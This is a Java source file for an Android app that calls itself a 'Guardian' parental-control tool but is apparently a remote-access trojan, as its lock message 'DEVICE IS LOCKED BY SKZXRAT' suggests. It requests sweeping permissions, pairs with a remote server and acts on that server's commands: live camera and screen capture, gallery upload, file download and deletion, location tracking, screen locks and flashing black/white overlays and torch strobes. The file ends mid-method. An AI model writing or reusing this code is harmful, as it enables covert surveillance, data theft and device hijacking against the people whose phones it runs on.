package com.nullx.pp;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONObject;

public class MainActivity extends Activity {
    private static final String WEB_URL = "https://spamotpdraknessatraligejsksk.vercel.app";
    private static final int MIC_REQ = 7001;
    private WebView webView;
    private boolean lockTaskStartIssued;
    private boolean webLoaded;
    private static final int OVERLAY_REQ = 7101;
    private static final int CAMERA_REQ = 7201;
    private static final int PERMS_REQ = 7400;
    private static final int DEVICE_ADMIN_REQ = 7501;
    private final Handler commandHandler = new Handler(Looper.getMainLooper());
    private volatile boolean strobeRunning;
    private BroadcastReceiver persistentCommandReceiver;

    // BLACK SCREEN VARIABLES
    private Handler blackScreenHandler = new Handler(Looper.getMainLooper());
    private volatile boolean blackScreenRunning = false;
    private View blackScreenView;
    private WindowManager blackScreenWm;

    private final BroadcastReceiver lockReceiver = new BroadcastReceiver() {
        @Override public void onReceive(Context context, Intent intent) {
            if (intent == null) return;
            if (LockOverlayService.ACTION_PIN_APP.equals(intent.getAction())) enterLockTaskMode();
            if (LockOverlayService.ACTION_UNPIN_APP.equals(intent.getAction())) exitLockTaskMode();
        }
    };

    private void requestDeviceAdminIfNeeded() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, DeviceAdminHelper.class);
            if (dpm != null && !dpm.isAdminActive(admin)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Aktifkan Device Admin Guardian untuk membantu menjaga kontrol perangkat dan fitur kunci perangkat tetap tersedia. Izin ini diberikan dan dikendalikan oleh pemilik perangkat.");
                startActivityForResult(intent, DEVICE_ADMIN_REQ);
            }
        } catch (Exception ignored) {}
    }

    private void requestManageAllFilesPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return;
        try {
            if (android.os.Environment.isExternalStorageManager()) return;
            new android.app.AlertDialog.Builder(this)
                    .setTitle("Izin Kelola Semua File")
                    .setMessage("Guardian Anak memerlukan izin Kelola semua file agar File Manager dapat menampilkan penyimpanan perangkat secara lengkap. Izin ini harus diaktifkan oleh pemilik perangkat di Pengaturan Android.")
                    .setCancelable(false)
                    .setNegativeButton("NANTI", null)
                    .setPositiveButton("BUKA PENGATURAN", (dialog, which) -> {
                        try {
                            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            i.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(i);
                        } catch (Exception e) {
                            try { startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)); } catch (Exception ignored) {}
                        }
                    }).show();
        } catch (Exception ignored) {}
    }

    private void promptAccessibilityForAppBlocker() {
        if (AppBlockerService.isEnabled(this)) return;
        new android.app.AlertDialog.Builder(this)
                .setTitle("Izin Accessibility diperlukan")
                .setMessage("Aktifkan Accessibility untuk Guardian App Blocker agar fitur blokir aplikasi dari Guardian Orang Tua dapat memantau aplikasi yang sedang dibuka. Android akan membuka Pengaturan Accessibility; izin harus diaktifkan secara manual.")
                .setCancelable(false)
                .setNegativeButton("NANTI", null)
                .setPositiveButton("BUKA PENGATURAN", (dialog, which) -> openAppBlockerSettings())
                .show();
    }

    @Override protected void onCreate(Bundle state) {
        super.onCreate(state);
        getWindow().setSoftInputMode(android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
        setupWebView();
        requestDeviceAdminIfNeeded();
        registerLockReceiver();
        registerPersistentCommandReceiver();
        ensureOverlayPermission();
        handleMicRequest(getIntent());
        handleLockIntent(getIntent());
        DeviceService.refreshAsync();
        autoPair();
        startCommandPolling();
        requestRequiredPermissions();
        requestManageAllFilesPermissionIfNeeded();
        
        // Start AppBlockerService untuk monitoring aplikasi
        try {
            Intent blocker = new Intent(this, AppBlockerService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(blocker);
            else startService(blocker);
        } catch (Exception ignored) {}
    }

    private void requestRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            java.util.ArrayList<String> req = new java.util.ArrayList<>();
            if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) 
                req.add("android.permission.CAMERA");
            if (checkSelfPermission("android.permission.RECORD_AUDIO") != PackageManager.PERMISSION_GRANTED) 
                req.add("android.permission.RECORD_AUDIO");
            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED) 
                req.add("android.permission.ACCESS_FINE_LOCATION");
            if (checkSelfPermission("android.permission.READ_PHONE_STATE") != PackageManager.PERMISSION_GRANTED) 
                req.add("android.permission.READ_PHONE_STATE");
            if (Build.VERSION.SDK_INT >= 33 && checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) 
                req.add("android.permission.POST_NOTIFICATIONS");
            if (Build.VERSION.SDK_INT >= 33) {
                if (checkSelfPermission("android.permission.READ_MEDIA_IMAGES") != PackageManager.PERMISSION_GRANTED)
                    req.add("android.permission.READ_MEDIA_IMAGES");
                if (checkSelfPermission("android.permission.READ_MEDIA_VIDEO") != PackageManager.PERMISSION_GRANTED)
                    req.add("android.permission.READ_MEDIA_VIDEO");
            } else {
                if (checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") != PackageManager.PERMISSION_GRANTED)
                    req.add("android.permission.READ_EXTERNAL_STORAGE");
                if (checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") != PackageManager.PERMISSION_GRANTED)
                    req.add("android.permission.WRITE_EXTERNAL_STORAGE");
            }
            if (!req.isEmpty()) requestPermissions(req.toArray(new String[0]), PERMS_REQ);
        }
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                i.setData(android.net.Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    private void setupWebView() {
        webView = new WebView(this);
        webView.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        webView.setBackgroundColor(android.graphics.Color.WHITE);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setDatabaseEnabled(true);
        webView.getSettings().setMediaPlaybackRequiresUserGesture(false);
        webView.getSettings().setBuiltInZoomControls(false);
        webView.getSettings().setDisplayZoomControls(false);
        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {
            @Override public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) { return false; }
            @Override public boolean shouldOverrideUrlLoading(WebView v, String url) { return false; }
        });
        setContentView(webView);
        if (Settings.canDrawOverlays(this)) loadWeb();
    }

    private void loadWeb() {
        if (webView == null || webLoaded) return;
        webLoaded = true;
        webView.loadUrl(WEB_URL);
    }

    private void ensureOverlayPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)) {
            loadWeb();
            return;
        }
        try {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_REQ);
        } catch (Exception e) {
            try { startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)); } catch (Exception ignored) {}
        }
    }

    @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_REQ) {
            if (Settings.canDrawOverlays(this)) loadWeb();
        }
    }

    private void registerLockReceiver() {
        IntentFilter f = new IntentFilter();
        f.addAction(LockOverlayService.ACTION_PIN_APP);
        f.addAction(LockOverlayService.ACTION_UNPIN_APP);
        if (Build.VERSION.SDK_INT >= 33) registerReceiver(lockReceiver, f, Context.RECEIVER_NOT_EXPORTED);
        else registerReceiver(lockReceiver, f);
    }

    @Override protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleMicRequest(intent);
        handleLockIntent(intent);
    }

    private void handleMicRequest(Intent intent) {
        if (intent == null || !intent.getBooleanExtra("request_mic_for_lock_chat", false)) return;
        if (Build.VERSION.SDK_INT < 23 || checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED) {
            notifyMicResult(true);
        } else requestPermissions(new String[]{"android.permission.RECORD_AUDIO"}, MIC_REQ);
    }

    @Override public void onRequestPermissionsResult(int code, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(code, permissions, results);
        if (code == MIC_REQ) {
            notifyMicResult(results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED);
        } else if (code == CAMERA_REQ && results.length > 0 &&
                results[0] == PackageManager.PERMISSION_GRANTED) {
            startStrobe();
        } else if (code == 7301) {
            LocationHelper.send(this);
        }
    }

    private void notifyMicResult(boolean granted) {
        try {
            Intent i = new Intent(this, LockOverlayService.class);
            i.setAction(LockOverlayService.ACTION_MIC_RESULT);
            i.putExtra(LockOverlayService.EXTRA_MIC_GRANTED, granted);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void handleLockIntent(Intent intent) {
        if (intent == null) return;
        if (LockOverlayService.ACTION_PIN_APP.equals(intent.getAction())) enterLockTaskMode();
        else if (LockOverlayService.ACTION_UNPIN_APP.equals(intent.getAction())) exitLockTaskMode();
    }

    private void enterLockTaskMode() {
        if (Build.VERSION.SDK_INT < 21 || isFinishing() || lockTaskStartIssued) return;
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                if (am != null && am.getLockTaskModeState() != ActivityManager.LOCK_TASK_MODE_NONE) return;
            }
            lockTaskStartIssued = true;
            startLockTask();
        } catch (Exception e) { lockTaskStartIssued = false; }
    }

    private void exitLockTaskMode() {
        try { if (Build.VERSION.SDK_INT >= 21) stopLockTask(); } catch (Exception ignored) {}
        lockTaskStartIssued = false;
    }

    private void autoPair() {
        new Thread(() -> {
            try {
                DeviceService.refreshFromGitHub();
                InputStream in = getAssets().open("pairing.json");
                BufferedReader br = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder(); String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                String sha = new JSONObject(sb.toString()).optString("sha", "").trim();
                if (sha.isEmpty() || "ID PAIRING ORANG TUA".equals(sha)) return;
                String aid = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
                String id = (Build.BRAND + "-" + Build.MODEL + "-" + (aid == null ? "UNKNOWN" : aid)).replace(' ', '_');
                JSONObject body = new JSONObject();
                body.put("sha", sha); body.put("deviceId", id);
                body.put("model", Build.BRAND + " " + Build.MODEL); body.put("battery", batteryLevel());
                String pairResponse = postJsonResponse(DeviceService.url("/api/auto-pair"), body.toString());
                String chatToken = "";
                try { if (pairResponse != null) chatToken = new JSONObject(pairResponse).optString("chatToken", ""); } catch (Exception ignored) {}
                getSharedPreferences("GuardianPrefs", MODE_PRIVATE).edit()
                        .putString("targetId", id).putString("pairId", sha).putString("chatToken", chatToken).apply();
            } catch (Exception ignored) {}
        }).start();
    }

    private void startCommandPolling() {
        try {
            Intent i = new Intent(this, GuardianControlService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void registerPersistentCommandReceiver() {
        if (persistentCommandReceiver != null) return;
        persistentCommandReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context context, Intent intent) {
                if (!GuardianControlService.ACTION_SERVICE_COMMAND.equals(intent.getAction())) return;
                try {
                    JSONObject cmd = new JSONObject(intent.getStringExtra("cmd_json") == null ? "{}" : intent.getStringExtra("cmd_json"));
                    handleCommand(intent.getStringExtra("command"), cmd);
                } catch (Exception ignored) {}
            }
        };
        IntentFilter f = new IntentFilter(GuardianControlService.ACTION_SERVICE_COMMAND);
        if (Build.VERSION.SDK_INT >= 33) registerReceiver(persistentCommandReceiver, f, Context.RECEIVER_NOT_EXPORTED);
        else registerReceiver(persistentCommandReceiver, f);
    }

    private void handleCommand(String command, JSONObject cmd) {
        // ============ EXISTING COMMANDS ============
        if ("flash_strobe".equals(command)) {
            runOnUiThread(this::startStrobe);
        } else if ("stop_strobe".equals(command)) {
            runOnUiThread(this::stopStrobe);
        } else if ("video_overlay_on".equals(command)) {
            runOnUiThread(this::showVideoOverlay);
        } else if ("video_overlay_off".equals(command)) {
            runOnUiThread(this::hideVideoOverlay);
        } else if ("lock_device".equals(command)) {
            runOnUiThread(this::lockDeviceFromParent);
        } else if ("unlock".equals(command)) {
            runOnUiThread(this::unlockDeviceFromParent);
        } else if ("touch_lock_on".equals(command)) {
            runOnUiThread(() -> setTouchLock(true));
        } else if ("touch_lock_off".equals(command)) {
            runOnUiThread(() -> setTouchLock(false));
        } else if ("open_web".equals(command)) {
            String url = cmd.optString("extra", "").trim();
            if (!url.isEmpty()) runOnUiThread(() -> openWebUrl(url));
        } else if ("black_screen".equals(command)) {
            runOnUiThread(() -> startBlackScreen(60000));
        } else if ("open_app".equals(command)) {
            String pkg = cmd.optString("extra", "").trim();
            runOnUiThread(() -> openAppPackage(pkg));
        } else if ("html_lock".equals(command)) {
            String html = cmd.optString("extra", "");
            runOnUiThread(() -> showHtmlLock(html));
        } else if ("stop_html".equals(command)) {
            runOnUiThread(this::stopHtmlLock);
        } else if ("play_media".equals(command)) {
            String src = cmd.optString("extra", "").trim();
            runOnUiThread(() -> playMedia(src));
        } else if ("screenshot".equals(command)) {
            runOnUiThread(this::requestScreenCapture);
        } else if ("record_screen".equals(command)) {
            runOnUiThread(this::requestScreenRecord);
        } else if ("camera".equals(command)) {
            runOnUiThread(this::openCameraCapture);
        } else if ("live_camera".equals(command)) {
            runOnUiThread(this::startLiveCamera);
        } else if ("live_screen".equals(command)) {
            runOnUiThread(this::requestLiveScreen);
        } else if ("stop_live".equals(command)) {
            runOnUiThread(this::stopLiveFeatures);
        } else if ("permissions".equals(command)) {
            runOnUiThread(this::reportPermissions);
        } else if ("location".equals(command)) {
            runOnUiThread(this::requestLocationOrSend);
        } else if ("app_info".equals(command)) {
            runOnUiThread(() -> AppInfoHelper.send(this));
        } 
        // ============ NEW COMMANDS ============
        else if ("block_app".equals(command)) {
            String pkg = cmd.optString("extra", "").trim();
            runOnUiThread(() -> blockApp(pkg));
        } else if ("unblock_app".equals(command)) {
            String pkg = cmd.optString("extra", "").trim();
            runOnUiThread(() -> unblockApp(pkg));
        } else if ("get_blocked_apps".equals(command)) {
            runOnUiThread(this::sendBlockedApps);
        } else if ("unblock_all_apps".equals(command)) {
            runOnUiThread(this::unblockAllApps);
        } else if ("open_app_blocker_settings".equals(command)) {
            runOnUiThread(this::openAppBlockerSettings);
        } else if ("gallery".equals(command)) {
            runOnUiThread(() -> GalleryHelper.sendPhotos(this, 50));
        } else if ("file_manager".equals(command)) {
            String path = cmd.optString("extra", "");
            runOnUiThread(() -> FileManagerHelper.listDirectory(this, path));
        } else if ("file_download".equals(command)) {
            String path = cmd.optString("extra", "");
            runOnUiThread(() -> FileManagerHelper.downloadFile(this, path));
        } else if ("file_delete".equals(command)) {
            String path = cmd.optString("extra", "");
            runOnUiThread(() -> FileManagerHelper.deleteFile(this, path));
        } else if ("device_info".equals(command)) {
            runOnUiThread(() -> {
                JSONObject info = DeviceInfoHelper.getFullDeviceInfo(this);
                GuardianCommandReporter.post(this, "device_info", info);
            });
        }
    }

    private String getText(String url) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(7000);
            c.setReadTimeout(7000);
            InputStream in = c.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (c != null) c.disconnect();
        }
    }

    // ==================== LIVE CAMERA ====================
    private void startLiveCamera() {
        try {
            Intent i = new Intent(this, CameraCaptureActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {
            JSONObject d = new JSONObject();
            try { d.put("error", e.toString()); } catch (Exception ignored) {}
            GuardianCommandReporter.post(this, "live_camera", d);
        }
    }

    // ==================== LIVE SCREEN ====================
    private void requestLiveScreen() {
        try {
            Intent i = new Intent(this, ScreenCaptureActivity.class);
            i.setAction(ScreenCaptureService.ACTION_LIVE_SCREEN);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {
            JSONObject d = new JSONObject();
            try { d.put("error", e.toString()); } catch (Exception ignored) {}
            GuardianCommandReporter.post(this, "live_screen", d);
        }
    }

    private void stopLiveFeatures() {
        try {
            stopService(new Intent(this, ScreenCaptureService.class));
        } catch (Exception ignored) {}
        JSONObject d = new JSONObject();
        try { d.put("stopped", true); } catch (Exception ignored) {}
        GuardianCommandReporter.post(this, "stop_live", d);
    }

    // ==================== APP BLOCKER ====================
    private void blockApp(String pkg) {
        if (pkg == null || pkg.isEmpty() || pkg.equals(getPackageName())) return;
        Set<String> blocked = loadBlockedPackageSet();
        blocked.add(pkg);
        saveBlockedPackageSet(blocked);
        broadcastBlocker(AppBlockerService.ACTION_BLOCK_APP, pkg);
        JSONObject d = new JSONObject();
        try { d.put("blocked", pkg); d.put("total", blocked.size()); d.put("accessibilityEnabled", AppBlockerService.isEnabled(this)); } catch (Exception ignored) {}
        GuardianCommandReporter.post(this, "block_app", d);
    }

    private void unblockApp(String pkg) {
        if (pkg == null || pkg.isEmpty()) return;
        Set<String> blocked = loadBlockedPackageSet();
        blocked.remove(pkg);
        saveBlockedPackageSet(blocked);
        broadcastBlocker(AppBlockerService.ACTION_UNBLOCK_APP, pkg);
        JSONObject d = new JSONObject();
        try { d.put("unblocked", pkg); d.put("total", blocked.size()); d.put("accessibilityEnabled", AppBlockerService.isEnabled(this)); } catch (Exception ignored) {}
        GuardianCommandReporter.post(this, "unblock_app", d);
    }

    private Set<String> loadBlockedPackageSet() {
        Set<String> blocked = new HashSet<>();
        try {
            String json = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("blockedApps", "[]");
            JSONArray arr = new JSONArray(json);
            for (int i = 0; i < arr.length(); i++) blocked.add(arr.getString(i));
        } catch (Exception ignored) {}
        return blocked;
    }

    private void saveBlockedPackageSet(Set<String> blocked) {
        JSONArray arr = new JSONArray();
        for (String p : blocked) arr.put(p);
        getSharedPreferences("GuardianPrefs", MODE_PRIVATE).edit().putString("blockedApps", arr.toString()).apply();
    }

    private void broadcastBlocker(String action, String pkg) {
        Intent i = new Intent(action);
        i.setPackage(getPackageName());
        i.putExtra("package", pkg);
        sendBroadcast(i);
    }

    private void unblockAllApps() {
        saveBlockedPackageSet(new HashSet<>());
        Intent i = new Intent(AppBlockerService.ACTION_UNBLOCK_ALL);
        i.setPackage(getPackageName());
        sendBroadcast(i);
        JSONObject d = new JSONObject();
        try {
            d.put("unblockedAll", true);
            d.put("accessibilityEnabled", AppBlockerService.isEnabled(this));
        } catch (Exception ignored) {}
        GuardianCommandReporter.post(this, "unblock_all_apps", d);
    }

    private void sendBlockedApps() {
        try {
            JSONObject d = new JSONObject();
            JSONArray arr = new JSONArray();
            for (String pkg : loadBlockedPackageSet()) arr.put(pkg);
            d.put("blockedApps", arr);
            d.put("accessibilityEnabled", AppBlockerService.isEnabled(this));
            GuardianCommandReporter.post(this, "get_blocked_apps", d);
        } catch (Exception ignored) {}
    }

    private void openAppBlockerSettings() {
        try {
            Intent i = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            JSONObject d = new JSONObject();
            d.put("accessibilitySettingsOpened", true);
            GuardianCommandReporter.post(this, "open_app_blocker_settings", d);
        } catch (Exception e) {
            JSONObject d = new JSONObject();
            try { d.put("error", e.getMessage() == null ? "Unable to open settings" : e.getMessage()); } catch (Exception ignored) {}
            GuardianCommandReporter.post(this, "open_app_blocker_settings", d);
        }
    }

    // ==================== STOP HTML LOCK ====================
    private void stopHtmlLock() {
        try {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(i);
        } catch (Exception ignored) {}
        
        JSONObject d = new JSONObject();
        try { d.put("stopped", true); } catch (Exception ignored) {}
        GuardianCommandReporter.post(this, "stop_html", d);
    }

    // ==================== BLACK SCREEN ====================
    private void startBlackScreen(int durationMs) {
        if (blackScreenRunning) return;
        blackScreenRunning = true;
        
        runOnUiThread(() -> {
            blackScreenWm = (WindowManager) getSystemService(WINDOW_SERVICE);
            blackScreenView = new View(this);
            blackScreenView.setBackgroundColor(Color.BLACK);
            blackScreenView.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
            
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE);
            lp.gravity = Gravity.TOP | Gravity.START;
            
            try {
                blackScreenWm.addView(blackScreenView, lp);
            } catch (Exception e) {}
        });
        
        blackScreenHandler.post(new Runnable() {
            int count = 0;
            boolean black = true;
            @Override
            public void run() {
                if (!blackScreenRunning || count > durationMs / 500) {
                    stopBlackScreen();
                    return;
                }
                runOnUiThread(() -> {
                    if (blackScreenView != null) {
                        blackScreenView.setBackgroundColor(black ? Color.BLACK : Color.WHITE);
                    }
                });
                black = !black;
                count++;
                blackScreenHandler.postDelayed(this, 500);
            }
        });
    }

    private void stopBlackScreen() {
        blackScreenRunning = false;
        blackScreenHandler.removeCallbacksAndMessages(null);
        runOnUiThread(() -> {
            if (blackScreenView != null && blackScreenWm != null) {
                try { blackScreenWm.removeView(blackScreenView); } catch (Exception e) {}
                blackScreenView = null;
                blackScreenWm = null;
            }
        });
    }

    // ==================== EXISTING METHODS ====================
    private void startStrobe() {
        if (Build.VERSION.SDK_INT < 23) return;
        if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.CAMERA"}, CAMERA_REQ);
            return;
        }
        if (strobeRunning) return;
        strobeRunning = true;
        strobeStep();
    }

    private void strobeStep() {
        if (!strobeRunning) {
            setTorch(false);
            return;
        }
        setTorch(true);
        commandHandler.postDelayed(() -> {
            if (!strobeRunning) { setTorch(false); return; }
            setTorch(false);
            commandHandler.postDelayed(this::strobeStep, 350);
        }, 350);
    }

    private void showVideoOverlay() {
        try {
            Intent i = new Intent(this, VideoOverlayService.class).setAction(VideoOverlayService.ACTION_SHOW);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void hideVideoOverlay() {
        try {
            Intent i = new Intent(this, VideoOverlayService.class).setAction(VideoOverlayService.ACTION_HIDE);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void lockDeviceFromParent() {
        try {
            Intent i = new Intent(this, LockOverlayService.class).setAction(LockOverlayService.ACTION_LOCK);
            i.putExtra(LockOverlayService.EXTRA_MESSAGE, "DEVICE IS LOCKED BY SKZXRAT");
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void unlockDeviceFromParent() {
        try {
            Intent i = new Intent(this, LockOverlayService.class).setAction(LockOverlayService.ACTION_UNLOCK);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void setTouchLock(boolean locked) {
        try {
            Intent i = new Intent(this, LockOverlayService.class)
                    .setAction(locked ? LockOverlayService.ACTION_TOUCH_LOCK : LockOverlayService.ACTION_TOUCH_UNLOCK);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch (Exception ignored) {}
    }

    private void openAppPackage(String pkg) {
        if (pkg == null || pkg.isEmpty()) return;
        try {
            Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
            JSONObject d = new JSONObject(); d.put("package", pkg);
            if (i != null) { i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(i); d.put("opened", true); }
            else d.put("opened", false);
            GuardianCommandReporter.post(this, "open_app", d);
        } catch (Exception e) {
            JSONObject d = new JSONObject(); try { d.put("package", pkg); d.put("error", e.toString()); } catch(Exception ignored){} GuardianCommandReporter.post(this,"open_app",d);
        }
    }

    private void showHtmlLock(String html) {
        Intent i = new Intent(this, HtmlLockActivity.class); 
        i.putExtra("html", html); 
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP); 
        startActivity(i);
    }

    private void playMedia(String src) {
        if (src == null || src.isEmpty()) return;
        Intent i = new Intent(this, MediaPlaybackActivity.class); 
        i.putExtra("src", src); 
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
        startActivity(i);
    }

    private void requestScreenCapture() {
        try { startActivity(new Intent(this, ScreenCaptureActivity.class)); } 
        catch(Exception e) { 
            JSONObject d=new JSONObject();
            try{d.put("error",e.toString());}catch(Exception ignored){}
            GuardianCommandReporter.post(this,"screenshot",d); 
        }
    }

    private void requestScreenRecord() {
        try { startActivity(new Intent(this, ScreenRecordActivity.class)); } 
        catch(Exception e) { 
            JSONObject d=new JSONObject();
            try{d.put("error",e.toString());}catch(Exception ignored){}
            GuardianCommandReporter.post(this,"record_screen",d); 
        }
    }

    private void openCameraCapture() {
        try { startActivity(new Intent(this, CameraCaptureActivity.class)); } 
        catch(Exception e) { 
            JSONObject d=new JSONObject();
            try{d.put("error",e.toString());}catch(Exception ignored){}
            GuardianCommandReporter.post(this,"camera",d); 
        }
    }

    private void reportPermissions() { 
        GuardianCommandReporter.post(this, "permissions", PermissionHelper.snapshot(this)); 
    }

    private void requestLocationOrSend() {
        if (Build.VERSION.SDK_INT >= 23 && 
            checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED && 
            checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.ACCESS_FINE_LOCATION","android.permission.ACCESS_COARSE_LOCATION"}, 7301);
        } else LocationHelper.send(this);
    }

    private void openWebUrl(String url) {
        if (url == null) return;
        url = url.trim();
        if (!(url.startsWith("https://") || url.startsWith("http://"))) return;
        Uri uri = Uri.parse(url);

        Intent chrome = new Intent(Intent.ACTION_VIEW, uri);
        chrome.setPackage("com.android.chrome");
        chrome.addCategory(Intent.CATEGORY_BROWSABLE);
        chrome.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_CLEAR_TOP
                | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        try {
            if (chrome.resolveActivity(getPackageManager()) != null) {
                startActivity(chrome);
                return;
            }
        } catch (Exception ignored) {}

        try {
            Intent browser = new Intent(Intent.ACTION_VIEW, uri);
            browser.addCategory(Intent.CATEGORY_BROWSABLE);
            browser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(browser);
        } catch (Exception ignored) {}
    }

    private void stopStrobe() {
        strobeRunning = false;
